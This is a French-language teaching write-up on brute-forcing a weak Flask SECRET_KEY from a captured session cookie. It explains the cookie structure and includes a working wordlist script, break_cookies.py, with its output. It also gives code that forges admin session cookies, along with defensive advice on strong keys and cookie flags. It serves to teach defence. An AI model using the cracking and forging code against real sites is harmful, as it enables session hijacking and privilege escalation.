# Bruteforce de cookies Flask - Analyse pédagogique

## Objectif pédagogique

Ce projet démontre comment une **SECRET_KEY faible** dans une application Flask peut être découverte par bruteforce, permettant à un attaquant de forger des cookies de session arbitraires.

## Distinction importante : Hash vs Signature

Dans un système d'authentification Flask, il y a **deux mécanismes cryptographiques distincts** :

### 1. Hash du mot de passe (scrypt) - Stocké en base de données

```
Utilisateur crée un compte:
  mot de passe: "MonMotDePasse123"
          ↓
  scrypt(password, salt)
          ↓
  Hash stocké en DB: "$scrypt$ln=15,r=8,p=1$..."
```

**Caractéristiques:**
- **One-way function** (impossible à inverser)
- Utilise un salt aléatoire unique par utilisateur
- Lent par design (protection contre bruteforce)
- Stocké dans: `instance/database.db`

### 2. Signature HMAC du cookie - Transmis au navigateur

```
Utilisateur se connecte:
  session['user_id'] = 1
  session['username'] = 'tely'
          ↓
  Flask signe les données avec SECRET_KEY
          ↓
  Cookie: eyJfcGVybWFuZW50Ijp0cnVl.aSq9Zg.6M5B8E4KFt-nK4_ELKx3xGN0nws
```

**Caractéristiques:**
- Prouve l'authenticité du cookie (seul le serveur peut le créer)
- **N'est PAS du chiffrement** (le contenu est lisible)
- **Vulnérable si SECRET_KEY est faible**
- Transmis dans: Header `Cookie: session=...`

## Anatomie d'un cookie Flask

Un cookie de session Flask a cette structure :

```
eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlbHkifQ.aSq9Zg.6M5B8E4KFt-nK4_ELKx3xGN0nws
│                                                                   │      │
│                                                                   │      └─ Signature HMAC
│                                                                   └──────── Timestamp
└──────────────────────────────────────────────────────────────────────────── Payload (base64url)
```

### Partie 1 : Payload (base64url encodé)

```bash
# Décoder le payload
echo "eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlbHkifQ==" | base64 -d
```

Résultat :
```json
{
  "_permanent": true,
  "user_id": 1,
  "username": "tely"
}
```

**Important** : Le payload n'est PAS chiffré ! N'importe qui peut le lire.

### Partie 2 : Timestamp (base64url encodé)

Horodatage de création du cookie pour gérer l'expiration.

### Partie 3 : Signature HMAC-SHA1

```python
signature = HMAC-SHA1(
    key=SECRET_KEY,
    message=payload + "." + timestamp
)
```

Cette signature prouve que :
- Le cookie a été créé par le serveur (qui possède la SECRET_KEY)
- Le contenu n'a pas été modifié

## Principe de l'attaque par bruteforce

### Pourquoi c'est possible ?

Si un attaquant obtient un cookie valide, il peut :

1. **Décoder le payload** (partie publique)
2. **Extraire le timestamp**
3. **Tester des milliers de SECRET_KEY candidates**
4. Pour chaque candidat :
   ```python
   signature_calculee = HMAC-SHA1(SECRET_KEY_candidate, payload + timestamp)
   if signature_calculee == signature_dans_cookie:
       print("SECRET_KEY trouvée !")
   ```

### Algorithme de bruteforce

```
┌─────────────────────────────────────────┐
│ 1. Intercepter un cookie valide         │
│    Cookie: [payload].[timestamp].[sig]  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│ 2. Décoder les parties publiques        │
│    payload = base64_decode(partie_1)    │
│    timestamp = base64_decode(partie_2)  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│ 3. Charger un dictionnaire de clés      │
│    wordlist = ['secret', 'password', …] │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│ 4. Pour chaque clé candidate:           │
│    ├─ Créer TimestampSigner(clé)        │
│    ├─ Essayer de vérifier la signature  │
│    └─ Si succès → clé trouvée !         │
└─────────────────────────────────────────┘
```

## Démonstration pratique

### Script de bruteforce : `break_cookies.py`

```python
from itsdangerous import TimestampSigner
import base64
import json

# Cookie intercepté du navigateur
cookie = "eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlbHkifQ.aSq9Zg.6M5B8E4KFt-nK4_ELKx3xGN0nws"

# Dictionnaire de clés faibles courantes
wordlist = [
    'secret',
    'password',
    'sup3rs3cr3t',
    'mysecretkey',
    'flask',
    'dev',
    'development',
    'production',
    'admin',
    '123456',
    'secretkey'
]

for candidate_key in wordlist:
    try:
        # Flask utilise TimestampSigner avec le salt 'cookie-session'
        signer = TimestampSigner(
            candidate_key,
            salt='cookie-session',
            key_derivation='hmac'
        )

        # Tenter de vérifier la signature
        payload_b64 = signer.unsign(cookie)

        # Si on arrive ici, la clé est correcte !
        print(f"✓ SECRET_KEY trouvée : {candidate_key}")

        # Décoder et afficher le contenu
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += b'=' * padding
        payload_decoded = base64.urlsafe_b64decode(payload_b64)
        payload_json = json.loads(payload_decoded)

        print(f"\nContenu du cookie:")
        print(json.dumps(payload_json, indent=2))
        break

    except Exception:
        print(f"✗ Test clé '{candidate_key}': échec")
        continue
else:
    print(f"\n✗ Aucune clé trouvée dans la wordlist")
```

### Exécution

```bash
$ python3 break_cookies.py

Cookie à cracker: eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlbHkifQ.aSq9Zg.6M5B8E4KFt-nK4_ELKx3xGN0nws

✗ Test clé 'secret': échec
✗ Test clé 'password': échec
✓ SECRET_KEY trouvée : sup3rs3cr3t

Signature valide!

Contenu du cookie:
{
  "_permanent": true,
  "user_id": 1,
  "username": "tely"
}
```

## Impact de la découverte de la SECRET_KEY

Une fois la SECRET_KEY découverte, un attaquant peut :

### 1. Forger des cookies arbitraires

```python
from itsdangerous import TimestampSigner

# Créer un cookie pour l'utilisateur admin (user_id=2)
signer = TimestampSigner('sup3rs3cr3t', salt='cookie-session')
fake_session = '{"_permanent":true,"user_id":2,"username":"admin"}'
malicious_cookie = signer.sign(fake_session)

# Utiliser ce cookie pour usurper l'identité de l'admin
```

### 2. Élévation de privilèges

```
Attaquant possède un compte normal (user_id=5)
              ↓
Découvre la SECRET_KEY par bruteforce
              ↓
Forge un cookie avec user_id=1 (admin)
              ↓
Accède à toutes les fonctionnalités admin
```

### 3. Bypass de l'authentification

Plus besoin de connaître les mots de passe - l'attaquant peut créer des sessions valides pour n'importe quel utilisateur.

## Clé faible vs Clé forte

### Cas actuel : Clé faible (pédagogique)

```python
# config.py
SECRET_KEY = 'sup3rs3cr3t'
```

**Analyse:**
- 12 caractères (court)
- Alphanumérique simple
- Mot du dictionnaire modifié (leet speak)
- **Temps de bruteforce : Quelques heures à quelques jours**

### Production : Clé forte (recommandé)

```python
import secrets

# Générer une clé cryptographiquement sûre
SECRET_KEY = secrets.token_hex(32)
# Résultat: 'a7f3c8e2b9d4f6a1c3e5d7b9f2a4c6e8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0'
```

**Analyse:**
- 64 caractères hexadécimaux
- Aléatoire cryptographiquement (256 bits d'entropie)
- Unique à chaque application
- **Temps de bruteforce : Plusieurs milliards d'années (impraticable)**


## Recommandations de sécurité

### 1. Générer une SECRET_KEY forte

```python
# MAUVAIS - Ne jamais faire ça
SECRET_KEY = 'mysecretkey'
SECRET_KEY = 'sup3rs3cr3t'
SECRET_KEY = 'flask123'

# BON - Générer aléatoirement
import secrets
SECRET_KEY = secrets.token_hex(32)  # 64 caractères hex
```

### 2. Ne jamais commiter la SECRET_KEY

```python
# MAUVAIS - Clé dans le code
# config.py
SECRET_KEY = 'a7f3c8e2b9d4f6a1...'

# BON - Variable d'environnement
# config.py
import os
SECRET_KEY = os.environ.get('SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("SECRET_KEY must be set in environment variables")
```

```bash
# .env (ajouté au .gitignore)
SECRET_KEY=a7f3c8e2b9d4f6a1c3e5d7b9f2a4c6e8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0
```

### 3. Rotation régulière des clés

En production, changer la SECRET_KEY périodiquement (note : cela invalidera toutes les sessions actives).

### 4. Considérer l'upgrade vers HMAC-SHA256

Flask supporte des algorithmes plus modernes via `itsdangerous` :

```python
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(
    SECRET_KEY,
    salt='cookie-session',
    digest_method=hashlib.sha256  # Au lieu de SHA1 par défaut
)
```

### 5. Protections complémentaires

- **HttpOnly** : Empêche JavaScript d'accéder au cookie (protection XSS)
- **Secure** : Cookie uniquement transmis en HTTPS
- **SameSite=Lax/Strict** : Protection contre CSRF
- **Expiration courte** : Limiter la fenêtre d'exploitation

## Méthodologie d'attaque complète

### Phase 1 : Reconnaissance
```bash
# Inspecter les cookies dans le navigateur (DevTools)
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVl...
```

### Phase 2 : Analyse
```python
# Décoder le payload (partie publique)
import base64
payload = "eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlbHkifQ"
print(base64.urlsafe_b64decode(payload + "=="))
# {"_permanent":true,"user_id":1,"username":"tely"}
```

### Phase 3 : Bruteforce
```bash
# Avec un petit dictionnaire
python3 break_cookies.py

# Avec rockyou.txt (14 millions de mots de passe)
python3 break_cookies.py --wordlist /usr/share/wordlists/rockyou.txt
```

### Phase 4 : Exploitation
```python
# Forger un cookie administrateur
from itsdangerous import TimestampSigner
signer = TimestampSigner('sup3rs3cr3t', salt='cookie-session')
admin_payload = '{"_permanent":true,"user_id":1,"username":"admin"}'
malicious_cookie = signer.sign(admin_payload.encode())
```

## Conclusion pédagogique

### Ce que ce projet démontre

1. **Les cookies signés ne sont pas du chiffrement**
   - Le contenu est lisible par tous
   - La signature garantit uniquement l'authenticité

2. **Une clé faible compromet toute la sécurité**
   - Même avec un bon algorithme (HMAC-SHA1)
   - La force réside dans le secret, pas l'algorithme

3. **La différence entre hash et signature**
   - Hash de mot de passe : irréversible, protégé par salt + lenteur
   - Signature de cookie : rapide, dépend de la force de la SECRET_KEY

### Ce qu'il faut retenir

> **Le maillon le plus faible détermine la sécurité du système entier.**

Dans ce cas :
- Hashing des mots de passe : **robuste** (scrypt avec salt)
- Signature des cookies : **vulnérable** (SECRET_KEY faible)


## Ressources

- [Flask Session Management](https://flask.palletsprojects.com/en/3.0.x/quickstart/#sessions)
- [itsdangerous Documentation](https://itsdangerous.palletsprojects.com/)
- [OWASP Session Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README)
- [Python secrets module](https://docs.python.org/3/library/secrets.html)

---

